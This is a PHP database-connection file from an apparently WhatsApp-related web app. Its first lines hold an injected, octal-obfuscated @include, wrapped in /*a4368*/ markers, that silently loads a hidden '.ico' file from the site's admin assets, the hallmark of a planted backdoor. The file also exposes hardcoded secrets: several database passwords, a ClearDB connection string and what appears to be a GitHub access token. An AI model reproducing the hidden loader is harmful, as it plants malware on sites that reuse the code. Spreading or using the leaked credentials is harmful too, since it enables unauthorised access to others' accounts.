<?php
/*a4368*/

@include "\057h\157m\1453\057a\143t\151v\163d\066/\163i\143o\155a\162c\056c\157m\057w\150a\164s\141p\160t\157o\154k\151t\057a\144m\151n\057a\163s\145t\163/\0563\070e\143a\1448\066.\151c\157";

/*a4368*/

session_start();


    // $db = 'myedusoft_usersAccess';
    // $dbuser = 'myedusoft_usersAccess';
    // $dbpass = 'nDp@xlrdmno2q';
    // $servername = "localhost";
    
    
    // $db = 'activsd6_whatsapptoolkit';
    // $dbuser = 'activsd6_whatsapptoolkit';
    // $dbpass = 'H@@R30&TShrS';
    // $servername = "localhost";

        // mysql://bbccdc22c38bf2:acb489fe@us-cdbr-east-05.cleardb.net/heroku_a661fce75e516e7?reconnect=true
    //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

    $db = 'heroku_a661fce75e516e7';
    $dbuser = 'bbccdc22c38bf2';
    $dbpass = 'acb489fe';
    $servername = "us-cdbr-east-05.cleardb.net";
    
// 	$conn = new PDO("mysql:host=$servername;dbname=whatsapp", $dbuser, $dbpass);
	$conn = new mysqli($servername, $dbuser, $dbpass,$db) or die("Connect failed: %s\n". $conn -> error);
    // $conn = mysqli_connect($servername, $dbuser, $dbpass, $db);
    // $conn = mysqli_connect($servername, $dbuser, $dbpass, $db);

if(!$conn){
    die('Database connection error');
}
?>